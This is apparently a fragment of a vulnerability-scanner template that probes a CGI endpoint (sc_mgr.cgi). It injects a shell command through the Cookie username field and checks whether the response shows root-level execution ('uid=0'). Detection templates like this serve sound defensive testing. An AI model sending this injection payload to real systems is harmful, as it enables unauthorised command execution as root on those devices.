http:

    GET /cgi-bin/sc_mgr.cgi?cmd=SC_Get_Info HTTP/1.1

    Connection: close
    Cookie: username=mopfdfsewo'& id & echo 'mopfdfsewo;


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - mopfdfsewo
    - uid=0
    condition: and
